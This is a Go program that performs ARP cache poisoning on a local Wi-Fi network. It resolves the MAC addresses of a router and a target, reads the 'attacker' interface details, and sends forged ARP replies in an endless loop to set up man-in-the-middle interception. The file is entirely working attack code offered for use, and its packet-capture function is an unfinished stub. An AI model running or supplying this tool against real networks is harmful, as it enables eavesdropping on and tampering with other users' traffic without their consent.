package main

import (
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func checkIPs(ips ...string) error {
	for _, ip := range ips {
		if net.ParseIP(ip) == nil {
			msg := ip + " not in the correct ipv4 format: x.x.x.x"
			return errors.New(msg)
		}
	}
	return nil
}

func ping(ips ...string) {
	var wg sync.WaitGroup

	for _, ip := range ips {
		wg.Add(1)
		go func(ip string) {
			defer wg.Done()
			fmt.Println("pinging ", ip)
			cmd := exec.Command("ping", ip)
			if err := cmd.Run(); err != nil {
				fmt.Println("failed to ping ", ip)
				return
			}
			fmt.Println("successfully pinged ", ip)
		}(ip)
	}

	wg.Wait()
}

type IPtoMAC struct {
	IPtoMAC map[string]string
	mu      sync.Mutex
}

func NewIPtoMAC() *IPtoMAC {
	return &IPtoMAC{
		IPtoMAC: make(map[string]string),
	}
}

func mapIPstoMAC(ips ...string) (*IPtoMAC, error) {
	ping(ips...)

	ipToMAC := NewIPtoMAC()

	data := exec.Command("arp", "-a")
	byteData, err := data.Output()
	if err != nil {
		return nil, err
	}

	lines := strings.Split(string(byteData), "\n")

	var wg sync.WaitGroup
	for _, ip := range ips {
		wg.Add(1)
		go func(ip string) {
			defer wg.Done()

			skip := false
			for _, line := range lines {
				if len(line) <= 0 {
					continue
				}

				// thank you: https://github.com/mostlygeek/arp/blob/master/arp_windows.go
				// interface lines don't start with whitespace. skip these
				if line[0] != ' ' {
					skip = true
					continue
				}

				// skip the header lines
				if skip {
					skip = false
					continue
				}

				// break up columns into fields
				fields := strings.Fields(line)

				if fields[0] == ip {
					ipToMAC.mu.Lock()
					ipToMAC.IPtoMAC[ip] = fields[1]
					ipToMAC.mu.Unlock()
				}
			}
		}(ip)
	}

	wg.Wait()

	return ipToMAC, nil
}

func poisonARPCache(deviceInfo *IPtoMAC, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle) error {
	for ipStr, vicMACStr := range deviceInfo.IPtoMAC {
		// build the layers

		vicMAC, err := net.ParseMAC(vicMACStr)
		if err != nil {
			return err
		}

		eth := layers.Ethernet{
			SrcMAC:       attackerInfo.MAC,
			DstMAC:       vicMAC,
			EthernetType: layers.EthernetTypeARP,
		}

		arp := layers.ARP{
			AddrType:          layers.LinkTypeEthernet,
			Protocol:          layers.EthernetTypeIPv4,
			HwAddressSize:     6,
			ProtAddressSize:   4,
			Operation:         layers.ARPReply,
			SourceHwAddress:   attackerInfo.MAC,
			SourceProtAddress: attackerInfo.IP.IP,
			DstHwAddress:      vicMAC,
			DstProtAddress:    net.ParseIP(ipStr),
		}

		// set up packet to write
		buf := gopacket.NewSerializeBuffer()
		opts := gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		}

		if err = gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
			return err
		}

		if err = deviceHandle.WritePacketData(buf.Bytes()); err != nil {
			return err
		}
	}

	return nil
}

type AttackerInfo struct {
	MAC net.HardwareAddr
	IP  *net.IPAddr
}

func getDevice() (*net.Interface, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}

	for _, iface := range ifaces {
		if iface.Name == "Wi-Fi" {
			return &iface, nil
		}
	}

	return nil, errors.New("failed to find appropriate interface")
}

func getAttackerInfo() (*AttackerInfo, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}

	var info AttackerInfo
	for _, iface := range ifaces {
		if iface.Name == "Wi-Fi" {
			info.MAC = iface.HardwareAddr
			addrs, err := iface.Addrs()
			if err != nil {
				return nil, err
			}

			for _, ip := range addrs {
				ipnet, ok := ip.(*net.IPAddr)
				if ok {
					info.IP = ipnet
					break
				}
			}
		}
	}

	return &info, nil
}

// TODO
func readPackets(deviceHandle *pcap.Handle) error {
	packetSource := gopacket.NewPacketSource(deviceHandle, deviceHandle.LinkType())

	for packet := range packetSource.Packets() {

	}

	return nil
}

func main() {
	if len(os.Args) != 3 {
		fmt.Println("usage: <router ip> <target ip>")
		os.Exit(0)
	}

	if err := checkIPs(os.Args[1], os.Args[2]); err != nil {
		log.Fatal(err)
	}

	attackerInfo, err := getAttackerInfo()
	if err != nil {
		log.Fatal(err)
	}

	device, err := getDevice()
	if err != nil {
		log.Fatal(err)
	}

	deviceHandle, err := pcap.OpenLive(device.Name, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer deviceHandle.Close()

	IPtoMAC, err := mapIPstoMAC(os.Args[1], os.Args[2])
	if err != nil {
		log.Fatal(err)
	}

	go func() {
		defer func() {
			if err := recover(); err != nil {
				log.Fatal(err)
			}
		}()
		if err := readPackets(deviceHandle); err != nil {
			panic(err)
		}
	}()

	for {
		if err = poisonARPCache(IPtoMAC, attackerInfo, deviceHandle); err != nil {
			log.Fatal(err)
		}
	}
}
